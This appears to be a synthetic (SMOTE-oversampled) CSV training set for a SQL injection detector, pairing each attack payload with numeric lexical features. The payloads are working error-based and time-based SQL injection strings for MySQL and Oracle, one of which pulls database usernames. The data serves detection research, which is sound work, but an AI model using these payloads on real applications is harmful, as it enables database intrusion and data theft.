id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000570,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000025,1.4824913251291738,319.6059464070574,40.775937769910826,4.038558896870764,109.32781330973249,58.5187553982166,116.7593776991083,35.0,0.3425652795721381,0.18226360431434202,0.36544559784027736,0.10972551827324255,0.22406223008917014,0.7759377699108299,2.0,0.0,2.0,2.0,0.0,20.77593776991083,0.0,0.4481244601783404,5.77593776991083,6.775937769910829,0.22406223008917026,0.7759377699108297,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.327813309732489,2.3278133097324893,1.0,1.2240622300891704,0.7759377699108296,0.22406223008917017,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22406223008917026,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.10375107964332
SMOTE_000571,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000010,4.6327311442084,210.454393393005,31.9297451542275,3.7807096747041125,71.90283381093376,33.76232411938876,80.32436288556875,24.464872577113752,0.3411708782484276,0.15699361541276977,0.384574589824644,0.11726091651415863,3.0702548457724994,0.0,0.0,0.0,0.0,0.9297451542275006,0.0,15.0702548457725,0.0,0.0,4.46487257711375,1.859490308455003,1.0,0.0,0.0,0.0,0.0,0.4648725771137504,1.0,0.0,0.0,1.0,0.0,0.9297451542275006,0.0,0.4648725771137503,0.0,0.5351274228862497,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5351274228862496,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4648725771137503,0.4648725771137503,4.394617731341251
SMOTE_000572,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000013,1.7366227665375011,341.2939607930647,36.0,3.708929159474579,96.50360784696582,48.0,138.21686274783272,58.57349019826618,0.2826788946636577,0.14071314662522003,0.40502622271580224,0.17158173599532012,0.0,2.573490198266179,1.0,0.0,0.0,2.6433725495665445,0.0,28.0,0.0,3.0,0.0,23.643372549566543,0.0,0.6433725495665449,0.0,0.3566274504334551,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.6433725495665449,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.6433725495665445
SMOTE_000573,attack,error,"1""   )    )    as czzg where 5483  =  5483 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000030,1.1141115829644312,230.81404609247497,36.781317811073464,3.7419096876468445,63.594495921808104,43.59406193093793,95.3753797420114,28.25010849771754,0.27043194062194376,0.1885539812434966,0.41733611420702077,0.1236779639275389,0.0,1.0,2.0,0.0,1.1562635622146928,2.0,0.0,16.781317811073464,0.0,0.0,4.312527124429385,5.312527124429385,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.4687906866440787,0.4687906866440783,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.15626356221469279,0.0,0.0,0.0,8.09384493550285
SMOTE_000574,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000021,1.3628958163430258,289.35325223342625,35.02717324872509,3.7407305409916267,93.96847414209559,35.38913070050996,120.13586624362547,39.85978114719521,0.3233458234494404,0.1237202565650109,0.4154703534299692,0.13746356655557956,0.0,4.0,0.0,0.0,1.6108692994900382,2.0,0.0,22.832607898470116,1.9999999999999996,1.610869299490038,5.0,3.610869299490039,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.610869299490038,0.0,0.0,1.610869299490038,1.8054346497450189,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8054346497450189,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8054346497450189,0.0,0.19456535025498106,0.19456535025498106,9.027173248725095
SMOTE_000575,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,1.0773095372901285,220.56066807409087,38.88558635249216,3.8154542515471004,66.24714995913791,39.36156360664576,91.36156360664576,23.59039090166144,0.30008756170573697,0.17812782364885968,0.4146980354265798,0.1070865792188236,0.0,0.2951954508307202,1.0,0.0,1.0,1.2951954508307204,0.0,16.0,0.0,0.0,3.0,3.29519545083072,0.0,0.2951954508307202,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.29519545083072024,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.29519545083072
SMOTE_000576,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000016,2.483007993547777,348.5416315596988,34.97224562686743,3.634897059786411,92.31959657463831,52.624894679096556,144.11101749253027,59.48612281343372,0.26495906535190866,0.15093322469148587,0.41342688062206806,0.1706808293345374,0.0,2.458368440301148,1.5138771865662841,0.0,0.0,3.0,0.0,29.027754373132566,0.0,1.4583684403011483,0.5138771865662841,24.513877186566283,0.0,1.0,0.5138771865662839,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.513877186566284,1.0,1.0,0.4861228134337161,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000577,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000014,0.5290806948095813,229.48745197919874,32.6389961583359,3.9255561047633716,80.2779923166718,43.55598463334359,81.01447887084744,24.6389961583359,0.3501731196946408,0.1895506699615274,0.3528591490104447,0.10741706133338716,2.3610038416641013,0.0,0.0,0.0,0.0,2.0,0.0,13.638996158335898,0.0,0.0,5.0,3.6389961583358987,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.8194980791679491,0.0,0.8194980791679494,0.0,0.18050192083205074,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.819498079167949
SMOTE_000578,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000022,0.7245141358780135,344.6285987451652,34.0,3.685021031485295,100.28598745165203,45.742802509669595,139.85700627417398,58.742802509669595,0.2909476604666647,0.13274162270083725,0.4058471334580406,0.1704635833744575,4.0,0.0,0.0,0.0,0.0,2.1857006274173987,0.0,28.371401254834797,0.37140125483479725,2.4428981177478044,0.18570062741739868,22.185700627417397,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000579,attack,error,-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,nearest_attack_euclidean,R000004,0.8496630041822929,333.7917464333449,36.0,3.680550546314837,93.22138906458838,48.0,135.87242076042028,56.69793660833622,0.27922929476227853,0.1438484042870652,0.4070878179231353,0.16983448302752097,0.0,0.6979366083362185,1.0,0.0,0.0,2.1744841520840548,0.0,28.0,0.0,3.0,0.0,23.174484152084055,0.0,0.17448415208405466,0.0,0.8255158479159453,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.17448415208405466,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.174484152084055
SMOTE_000580,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,1.3057533985675915,226.5466033509802,41.32161983912002,4.28317925895386,127.24255375318016,2.0,72.98242975868004,24.321619839120018,0.5603251517016504,0.008888891229493157,0.323360480216614,0.10742547685224242,3.0,0.0,0.0,0.0,0.0,3.3304049597800054,0.0,10.0,0.0,4.991214879340015,1.0,3.3304049597800054,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.3304049597800052,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.330404959780005
SMOTE_000581,attack,error,"1',  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000028,0.20551297529966372,249.99486704761892,36.03553096598639,4.0093495077897865,94.17765482993195,35.0,89.56849545578226,31.24871676190474,0.37679553666183685,0.1400574087444846,0.35819831240125405,0.12494874219242445,0.9644690340136091,0.14212386394556364,0.0,0.0,2.0,1.035530965986391,0.0,18.071061931972782,0.07106193197278188,2.0,5.964469034013609,3.035530965986391,0.9644690340136091,0.03553096598639094,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.03553096598639094,0.03553096598639088,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.071061931972782
SMOTE_000582,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000026,2.601970092832135,317.54279936912616,37.20952220469795,3.9196753846145427,108.60476110234897,47.095222046979494,123.60948850335488,38.23332771644282,0.3463048205790683,0.14661926567394798,0.38636922820887304,0.12070668553811066,4.0,0.0,0.0,0.0,2.0,2.0,0.0,22.838088818791796,0.0,0.7904777953020508,5.6047611023489745,4.6047611023489745,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.814283307046924,1.814283307046924,0.0,1.3952388976510255,1.3952388976510255,0.6047611023489745,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3952388976510254,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.419044409395898
SMOTE_000583,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,0.5007668278575438,336.5120742625057,34.0,3.4830455012692716,80.60482970500226,52.504024754168555,146.20160990166744,57.201609901667425,0.23950236256013052,0.15599335122384794,0.4345140850723476,0.16999020114367389,0.0,0.1008049508337111,1.100804950833711,0.0,0.0,2.100804950833711,0.0,30.899195049166288,0.0,0.0,1.0,23.20160990166742,0.0,0.10080495083371124,0.10080495083371105,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.10080495083371127,1.0,0.10080495083371122,0.8991950491662889,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.1008049508337105
SMOTE_000584,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000029,2.730457618643949,301.628849695722,32.82911838761478,3.574985070483051,78.14559193807386,44.316473550459094,129.26589420183637,49.900890005352665,0.2629456478616168,0.14803283011301485,0.4277611538333029,0.16126036819206555,0.0,4.0,0.0,0.0,0.0,2.6097061292049246,0.0,25.316473550459097,1.9999999999999996,0.0,2.5611754831803015,14.80382871330342,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.3902938707950753,0.6097061292049248,1.0,0.0,0.0,0.6097061292049247,1.6097061292049246,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3902938707950753,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.609706129204925
SMOTE_000585,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000026,1.8639159458820957,325.6147426224573,37.433742850623815,3.89911689737998,108.71687142531191,49.33742850623815,128.5423427137239,39.018099977183354,0.3374333421301851,0.15011960907686644,0.3923671139317117,0.12007993486123675,4.0,0.0,0.0,0.0,2.0,2.0,0.0,23.73497140249526,0.0,0.5662571493761855,5.716871425311907,4.716871425311908,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.150614275935721,2.150614275935722,0.0,1.2831285746880927,1.2831285746880927,0.7168714253119073,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.28312857468809266,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,12.86748570124763
SMOTE_000586,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000014,1.0173613294864063,230.34682371625559,34.0437646524984,3.8998926677255366,77.86870604250478,43.608313796668796,84.04376465249841,24.8260392245836,0.33738984175854536,0.1890722354879218,0.36568465471360323,0.10785326803992962,1.8260392245835995,0.0,0.17396077541640065,0.0,0.17396077541640065,1.8260392245835992,0.0,14.347921550832801,0.0,0.0,4.652078449167199,3.8260392245836004,1.0,0.0,0.0,0.17396077541640065,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.8260392245835995,0.0,0.8260392245835995,0.0,0.0,0.17396077541640065,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.17396077541640065,0.0,1.0,1.0,6.0
SMOTE_000587,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000029,1.6455132051115997,344.4751018517955,34.73755092589776,3.609047323727443,89.53163194423318,48.631224537051125,145.04979629640897,61.26244907410224,0.25979819696793977,0.14118710164988157,0.4211505957402689,0.1778641056419098,0.0,4.0,0.3687754629488788,0.0,0.0,3.0,0.0,29.262449074102243,1.2624490741022423,1.1063263888466361,0.6312245370511214,23.36877546294888,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.6312245370511214,0.36877546294887875,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000588,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000017,2.865184529555624,284.45968758181726,38.316415455614816,3.9553190774640297,102.51044121497284,38.510441214972836,106.75522060748642,36.683584544385184,0.360272638644706,0.13508808113146037,0.3754135527908707,0.12922572743296298,0.4388051518716045,2.2447793925135824,0.8776103037432089,0.0,2.0,2.0,0.0,20.0,1.1223896962567912,2.0,5.0,4.877610303743209,0.4388051518716044,0.5611948481283957,0.4388051518716044,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.4388051518716044,2.0,0.5611948481283957,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000589,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000010,2.472703626611168,200.9174590859313,31.496248140269607,3.7247458118591306,68.21810919229165,29.210605472830856,79.24062035067402,24.248124070134804,0.3391525723129961,0.14268996900079872,0.3966746751670135,0.12148278351919166,3.5037518597303947,0.0,0.0,0.0,0.0,0.4962481402696053,0.0,15.503751859730396,0.0,0.0,4.248124070134803,0.9924962805392123,1.0,0.0,0.0,0.0,0.0,0.24812407013480264,1.0,0.0,0.0,1.0,0.0,0.49624814026960506,0.0,0.24812407013480267,0.0,0.7518759298651974,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7518759298651974,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2481240701348027,0.2481240701348027,3.7443722104044075
SMOTE_000590,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000010,3.731588508833011,198.23822220335273,33.86546859247052,3.714072067510603,63.64181642594119,28.6563864627646,81.94001931464697,24.0,0.32213241660277364,0.14329123041870048,0.4131460918685794,0.12143026110994648,2.925449277823554,0.0,0.35818357405881524,0.0,0.3581835740588153,0.3581835740588155,0.0,16.0,0.0,0.0,3.641816425941185,1.074550722176447,1.0,0.0,0.0,0.3581835740588153,0.0,0.3581835740588153,1.0,0.0,0.0,1.0,0.0,0.35818357405881507,0.0,0.0,0.0,0.6418164259411847,0.35818357405881524,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6418164259411847,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3581835740588153,0.0,0.3581835740588153,0.3581835740588153,4.074550722176445
SMOTE_000591,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000005,2.0842087180352604,215.02661896937423,35.6873703095133,3.8128229855044826,67.6252593809734,37.0,86.06211092853991,24.339248659860942,0.31523264013830876,0.172139394630024,0.39947905312036114,0.11314891211130612,1.9911270102085858,0.0,0.6696243299304714,0.0,0.6696243299304714,1.3303756700695286,0.0,15.348121649652356,0.0,0.0,3.6607513401390572,2.669624329930471,1.0,0.0,0.0,0.6696243299304714,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.3303756700695286,0.6696243299304714,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6696243299304714,0.0,1.0,1.0,5.669624329930471
SMOTE_000592,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000013,0.06143540686643228,346.79814105456353,36.0,3.729749812539522,98.91168671137156,48.0,139.9369190795511,59.94953526364088,0.2852097767175195,0.13841288932656218,0.4035136837368671,0.1728636502190513,0.0,3.9495352636408887,1.0,0.0,0.0,2.9873838159102224,0.0,28.0,0.0,3.0,0.0,23.98738381591022,0.0,0.9873838159102224,0.0,0.012616184089777799,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.9873838159102222,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.987383815910222
SMOTE_000593,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,1.1850326478088515,234.62491788525097,40.16846755025013,3.8701143394732163,70.95104768425045,42.782580134000334,95.89129006700017,25.0,0.30204725281502515,0.1820107447458561,0.4091740049350508,0.10676799750406804,0.2771774832499583,0.7228225167500415,1.0,0.0,1.0,1.7228225167500415,0.0,16.277177483249957,0.0,0.0,3.0,3.7228225167500417,0.27717748324995856,0.7228225167500415,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.7228225167500415,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.722822516750042
